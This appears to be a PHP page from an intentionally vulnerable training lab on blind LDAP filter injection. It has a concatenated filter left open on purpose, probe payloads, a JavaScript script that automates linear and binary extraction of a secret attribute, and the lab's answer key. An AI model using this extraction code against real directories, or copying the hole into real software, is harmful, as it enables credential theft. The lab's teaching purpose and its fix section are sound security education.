<?php
require_once __DIR__ . '/helpers.php';

$L    = 9;
$meta = xl_levels()[$L];

/** Six characters, a-z0-9, on uid=svc_rotate. Never returned by this endpoint. */
const L9_KEY = 'm2v7qd';

xl_counter_start();

/** One code path for the form and for the console. */
function l9_filter(string $u): string
{
    return "(&(uid=" . $u . ")(objectClass=inetOrgPerson))";
}

/**
 * @return array{matched:bool,ok:bool,error:?string,filter:string,tree:?array,count:int}
 */
function l9_run(string $u): array
{
    $filter = l9_filter($u);
    try {
        $tree = ldap_parse($filter);                 // strict: one filter, whole string
        $hits = ldap_search(xl_directory(), $tree);
        return ['matched' => $hits !== [], 'ok' => true, 'error' => null,
                'filter' => $filter, 'tree' => $tree, 'count' => count($hits)];
    } catch (LdapFilterError $e) {
        return ['matched' => false, 'ok' => false, 'error' => $e->getMessage(),
                'filter' => $filter, 'tree' => null, 'count' => 0];
    }
}

if (isset($_GET['reset'])) {
    xl_counter_reset($L);
    header('Location: level9.php');
    exit;
}

if (isset($_GET['probe'])) {
    $r = l9_run((string)($_GET['u'] ?? ''));
    $n = xl_counter_bump($L);
    header('Content-Type: application/json');
    echo json_encode([
        'matched'  => $r['matched'],
        'ok'       => $r['ok'],
        'error'    => $r['error'],
        'filter'   => $r['filter'],
        'requests' => $n,
    ]);
    exit;
}

$u      = isset($_GET['u']) ? (string)$_GET['u'] : '';
$answer = isset($_GET['answer']) ? trim((string)$_GET['answer']) : '';
$sent   = isset($_GET['u']) && $u !== '';

$flag     = '';
$result   = '';
$pipeline = [];

if ($sent) {
    xl_counter_bump($L);
    $r = l9_run($u);

    $pipeline = [
        ['label' => '$_GET["u"] (raw)', 'value' => $u],
        ['label' => 'filter assembled by concatenation', 'value' => $r['filter']],
        ['label' => 'strict parse (the client rejects anything left over)',
         'value' => $r['ok'] ? ldap_filter_to_string($r['tree']) : 'parse error',
         'note'  => $r['ok'] ? xl_tree_block($r['tree']) : '<code>' . lk_esc((string)$r['error']) . '</code>',
         'verdict' => $r['ok'] ? 'pass' : 'block'],
        ['label' => 'what the page prints', 'value' => $r['matched'] ? 'matched' : 'did not match',
         'note'  => 'The entries themselves are never rendered. Only this word changes.',
         'verdict' => $r['matched'] ? 'pass' : 'block'],
        ['label' => 'probe requests served (this session)', 'value' => (string)xl_counter_get($L),
         'note'  => 'Counted server side, console requests included.
                     <a href="level9.php?reset=1">reset the counter</a>'],
    ];

    if (!$r['ok']) {
        $result = '<div class="message error"><strong>Refused.</strong> The filter did not parse:
                   <code>' . lk_esc((string)$r['error']) . '</code></div>';
    } else {
        $result = $r['matched']
            ? '<div class="message success"><strong>matched</strong></div>'
            : '<div class="message error"><strong>did not match</strong></div>';
    }
} else {
    $pipeline = [
        ['label' => 'probe requests served (this session)', 'value' => (string)xl_counter_get($L),
         'note'  => 'Counted server side. <a href="level9.php?reset=1">reset the counter</a> before you measure a
                     strategy, then run the linear and the binary recovery and compare the two numbers.'],
    ];
}

if ($answer !== '') {
    if (strcasecmp($answer, L9_KEY) === 0) {
        $flag    = xl_flag($L);
        $result .= '<div class="message success"><strong>' . lk_esc($answer)
                 . '</strong> is the <code>recoveryKey</code> on <code>uid=svc_rotate</code>.</div>';
    } else {
        $result .= '<div class="message error"><code>' . lk_esc($answer)
                 . '</code> is not the recovery key. Six characters, lowercase letters and digits.</div>';
    }
}

$code = <<<'PHP'
// Account status check for the help desk. Answers matched / did not match
// so that the desk can confirm an account without seeing its attributes.
$u = $_GET['u'];

$filter = "(&(uid=" . $u . ")(objectClass=inetOrgPerson))";

// The client rejects anything that is not exactly one complete filter,
// so the payload has to stay balanced.
$entries = $ldap->search($base, $filter);

echo count($entries) > 0 ? 'matched' : 'did not match';
PHP;

$fixBad = <<<'PHP'
$filter = "(&(uid=" . $u . ")(objectClass=inetOrgPerson))";
echo count($ldap->search($base, $filter)) > 0 ? 'matched' : 'did not match';
PHP;

$fixGood = <<<'PHP'
$filter = sprintf(
    '(&(uid=%s)(objectClass=inetOrgPerson))',
    ldap_escape($u, '', LDAP_ESCAPE_FILTER)
);

// Then narrow what the search is allowed to see. An LDAP search takes a
// list of attributes; asking for exactly the ones you need means an
// injected clause has nothing extra to test against.
$entries = $ldap->search($base, $filter, ['uid', 'cn']);

// And rate limit. A boolean endpoint that answers in single-digit
// milliseconds is a data export with extra steps.
$limiter->hit($clientIp, 'account-status', max: 20, per: '1 minute');
PHP;

$console = <<<'HTML'
<div class="xl-console">
  <h4>Blind probe console</h4>
  <div class="form-group">
    <label class="form-label">Payload template &mdash; <code>{TEST}</code> becomes the operator and value under test</label>
    <input id="xl-tpl" class="form-control" spellcheck="false" value="svc_rotate)(recoveryKey{TEST}">
  </div>
  <div class="form-group">
    <label class="form-label">Assertion to test (include the operator)</label>
    <input id="xl-test" class="form-control" spellcheck="false" value="=m*">
  </div>
  <div class="xl-btnrow">
    <button class="btn btn-outline" id="xl-one" type="button">Send one probe</button>
    <button class="btn btn-outline" id="xl-lin" type="button">Recover key (linear, =prefix*)</button>
    <button class="btn btn-outline" id="xl-bin" type="button">Recover key (binary, &gt;=prefix)</button>
    <button class="btn btn-outline" id="xl-clr" type="button">Clear log</button>
    <a class="btn btn-outline" href="level9.php?reset=1">Reset server counter</a>
  </div>
  <div class="xl-meter">
    <span>requests fired here: <b id="xl-rq">0</b></span>
    <span>recovered: <b class="xl-recovered" id="xl-out">&mdash;</b></span>
  </div>
  <pre class="xl-log" id="xl-log"></pre>
</div>
HTML;

$script = <<<'HTML'
<script>
(function () {
  // Sorted the way the ordering filter sorts, so an index bisect and a
  // ">=" comparison agree with each other.
  var A = '0123456789abcdefghijklmnopqrstuvwxyz';
  var MAXLEN = 16;
  var n = 0, busy = false;
  var $ = function (id) { return document.getElementById(id); };

  function log(s) { var l = $('xl-log'); l.textContent += s + "\n"; l.scrollTop = l.scrollHeight; }

  function probe(test) {
    var payload = $('xl-tpl').value.replace('{TEST}', test);
    return fetch('level9.php?probe=1&u=' + encodeURIComponent(payload))
      .then(function (r) { return r.json(); })
      .then(function (j) {
        n++; $('xl-rq').textContent = n;
        log('#' + n + '  (recoveryKey' + test + ')   ->  ' + (j.matched ? 'MATCHED' : 'no')
            + (j.ok ? '' : '   [rejected: ' + j.error + ']'));
        return j.matched;
      });
  }

  var exact  = function (p) { return probe('=' + p); };
  var starts = function (p) { return probe('=' + p + '*'); };
  var atLeast = function (p) { return probe('>=' + p); };

  function recoverLinear() {
    log('-- linear: one request per candidate character, up to ' + A.length + ' per position --');
    var out = '';
    function pos() {
      if (out.length >= MAXLEN) { log('   stopped at ' + MAXLEN + ' characters'); return; }
      return exact(out).then(function (done) {
        if (done) { log('   recovered "' + out + '" after ' + n + ' total requests'); return; }
        var k = 0;
        function ch() {
          if (k >= A.length) { log('   no character extends "' + out + '" - stopping'); return; }
          var c = A[k];
          return starts(out + c).then(function (t) {
            if (t) { out += c; $('xl-out').textContent = out; return pos(); }
            k++; return ch();
          });
        }
        return ch();
      });
    }
    return pos();
  }

  function recoverBinary() {
    log('-- binary: ">=" is an ordering filter, so each position costs 6 requests --');
    var out = '';
    function pos() {
      if (out.length >= MAXLEN) { log('   stopped at ' + MAXLEN + ' characters'); return; }
      return exact(out).then(function (done) {
        if (done) { log('   recovered "' + out + '" after ' + n + ' total requests'); return; }
        var lo = 0, hi = A.length - 1;
        function step() {
          if (lo >= hi) {
            out += A[lo]; $('xl-out').textContent = out; return pos();
          }
          var mid = Math.ceil((lo + hi) / 2);
          return atLeast(out + A[mid]).then(function (t) {
            if (t) { lo = mid; } else { hi = mid - 1; }
            return step();
          });
        }
        return step();
      });
    }
    return pos();
  }

  function run(fn) {
    if (busy) { return; }
    busy = true;
    Promise.resolve(fn()).catch(function (e) { log('error: ' + e); }).then(function () { busy = false; });
  }

  $('xl-one').addEventListener('click', function () { run(function () { return probe($('xl-test').value); }); });
  $('xl-lin').addEventListener('click', function () { run(recoverLinear); });
  $('xl-bin').addEventListener('click', function () { run(recoverBinary); });
  $('xl-clr').addEventListener('click', function () { $('xl-log').textContent = ''; });
})();
</script>
HTML;

lk_page([
    'lab'        => xl_lab(),
    'level'      => $L,
    'title'      => $meta['title'],
    'difficulty' => $meta['difficulty'],
    'extra_head' => xl_extra_head(),
    'extra_body' => $script,

    'code'       => $code,
    'vuln_lines' => [5],
    'annotation' => 'The endpoint returns one bit and no attributes, so the developer treated the filter as
        harmless. An injected clause makes that bit describe an attribute the endpoint never selects:
        <code>(recoveryKey=m*)</code> is answered honestly, and the answer is a character.',

    'theory' => '<p>LDAP has no substring <em>function</em>, so the XPath approach from level 3 does not port. It
        has something as good: substring <em>assertions</em>. <code>(attr=m*)</code> asks whether a value begins
        with "m", and the server answers by matching or not matching. Chaining prefixes recovers the value one
        character at a time without ever asking the directory to return it.</p>
        <p>The cost is worth working out rather than assuming. Prefix probing is a linear scan of the alphabet per
        position. Ordering filters &mdash; <code>&gt;=</code> and <code>&lt;=</code> &mdash; compare whole values
        in collation order, and because the value already starts with the prefix you have recovered,
        <code>(attr&gt;=&lt;prefix&gt;c)</code> is true exactly when the next character is at or after
        <code>c</code>. That is a comparison you can bisect, and bisection turns 36 requests per character into
        six.</p>
        <p>Length is the other difference from XPath. There is no <code>string-length()</code> here, so you learn
        the length by discovering that no character extends the prefix &mdash; or, more cheaply, by testing the
        prefix for exact equality at each step, which costs one request per position and terminates the search as
        soon as it is complete.</p>',

    'fix' => [
        'bad'  => $fixBad,
        'good' => $fixGood,
        'note' => 'The attribute list matters more than it looks. A search that requests two attributes still
            evaluates the filter against all of them, so it is not a substitute for escaping &mdash; but it does
            keep a future bug from turning into a full attribute dump.',
    ],

    'scenario' => '<strong>Scenario:</strong> a help desk account-status check. It prints <code>matched</code> or
        <code>did not match</code>, nothing else, and the client refuses to send a filter that is not exactly one
        complete filter.
        <br><strong>Goal:</strong> recover the six-character <code>recoveryKey</code> attribute on
        <code>uid=svc_rotate</code> and submit it. The flag is gated on the value.',

    'model' => [
        'title' => 'Two strategies, and what each one costs',
        'html'  => '<pre class="lk-sinkline">(&amp;(uid=<span class="lk-inj">svc_rotate)(recoveryKey=m*</span>)(objectClass=inetOrgPerson))</pre>
        <p>Your clause is a third child of the AND. The parse stays balanced, the objectClass clause is satisfied by
        the target entry anyway, and the page&rsquo;s single bit now reports on <code>recoveryKey</code>.</p>
        <table class="lk-kv">
            <tr><td><code>(recoveryKey=*)</code></td><td>does the attribute exist at all? Ask this first &mdash;
                one request that saves you from extracting nothing.</td></tr>
            <tr><td><code>(recoveryKey=m*)</code></td><td>does the value start with "m"? One character per
                answer.</td></tr>
            <tr><td><code>(recoveryKey=m2v7qd)</code></td><td>equality. This is how you know you have reached the
                end rather than run out of alphabet.</td></tr>
            <tr><td><code>(recoveryKey&gt;=m2n)</code></td><td>ordering. True when the value sorts at or after
                that string, which is a comparison you can bisect.</td></tr>
        </table>
        <p>Arithmetic for a six-character value over a 36-character alphabet:</p>
        <table class="lk-kv">
            <tr><td>linear</td><td>up to 36 prefix probes per position, plus one equality probe per position to
                detect the end: <strong>6&times;36 + 7 = 223</strong> requests, worst case. About 115 on
                average.</td></tr>
            <tr><td>binary</td><td>2<sup>5</sup> &lt; 36 &le; 2<sup>6</sup>, so six ordering probes per position,
                plus the same equality probes: <strong>6&times;6 + 7 = 43</strong> requests, worst case and
                average, because a bisection always costs the same.</td></tr>
        </table>
        <p>Reset the server counter, run one strategy, read the number in the trace, reset, run the other. The
        gap is the lesson.</p>',
    ],

    'form' => xl_form(
            [['name' => 'u', 'label' => 'Check an account', 'value' => $u, 'placeholder' => 'svc_rotate']],
            'Check status',
            'Form probes and console probes hit the same endpoint and share the counter.'
        )
        . $console
        . xl_answer_form('The <code>recoveryKey</code> you recovered', $answer),

    'result'   => $result,
    'flag'     => $flag,
    'flag_msg' => 'An endpoint that returns no attributes gave up an attribute.',
    'why'      => '<p>Every request asked a question the directory was willing to answer: does an entry satisfy
        this filter. You added a clause so that the answer also described a value the endpoint never selects, and
        the parse stayed balanced so the client had no reason to refuse it.</p>
        <p>The two numbers in your log are the part to carry forward. Blind extraction is a search problem, and how
        you phrase the question decides whether it costs two hundred requests or forty. In an environment with
        alerting on request volume, that is the difference between an attack that completes and one that does
        not.</p>',

    'pipeline' => $pipeline,
    'sink'     => [
        'label'    => 'filter string handed to the LDAP client',
        'before'   => '(&(uid=',
        'injected' => $u,
        'after'    => ')(objectClass=inetOrgPerson))',
    ],
    'probes'   => [
        'param'  => 'u',
        'method' => 'GET',
        'action' => 'level9.php',
        'items'  => [
            ['q'       => 'Can I add a clause without breaking the strict parse?',
             'payload' => 'svc_rotate)(objectClass=*',
             'learn'   => 'A clause that is true for every entry. If the page still says <code>matched</code>, the
                           injection point is confirmed and the parentheses balance.'],
            ['q'       => 'Does the target attribute exist on this entry?',
             'payload' => 'svc_rotate)(recoveryKey=*',
             'learn'   => 'A presence assertion. One request tells you whether there is anything to extract, which
                           is worth knowing before you spend two hundred.'],
            ['q'       => 'Do ordering filters work here?',
             'payload' => 'svc_rotate)(recoveryKey>=0',
             'learn'   => 'Should match, since any value sorts at or after "0". Confirms <code>&gt;=</code> parses
                           and is evaluated, which is the prerequisite for the binary strategy.'],
        ],
    ],
    'hints' => xl_hints($L),
]);
